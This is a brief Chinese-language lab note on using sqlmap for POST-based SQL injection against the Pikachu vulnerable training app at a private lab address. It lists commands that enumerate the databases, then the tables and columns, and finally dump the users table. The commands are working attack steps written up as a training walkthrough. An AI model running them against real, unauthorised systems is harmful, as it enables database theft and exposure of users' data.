# sqlmap使用

## 1.post

![sql1](D:\1-政企业务\pics\sql1.png)

对靶场测试，post的一个注入

sqlmap -u "http://ip/pikachu/vul/sqli/sqli_id.php#/" --data="id=1&submit=%E6%9F%A5%E8%AF%A2" --forms --dbs

--forms 测试表单，--dbs爆库

sqlmap -u "http://192.168.127.130/pikachu/vul/sqli/sqli_id.php#/" --data="id=1&submit=%E6%9F%A5%E8%AF%A2" -D pikachu --tables

-D指定库 --tables爆表

sqlmap -u "http://192.168.127.130/pikachu/vul/sqli/sqli_id.php#/" --data="id=1&submit=%E6%9F%A5%E8%AF%A2" -D pikachu -T users --columns

-T指定表 --columns爆列



sqlmap -u "http://192.168.127.130/pikachu/vul/sqli/sqli_id.php#/" --data="id=1&submit=%E6%9F%A5%E8%AF%A2" -D pikachu -T users -C 列1,列2 --dump

爆信息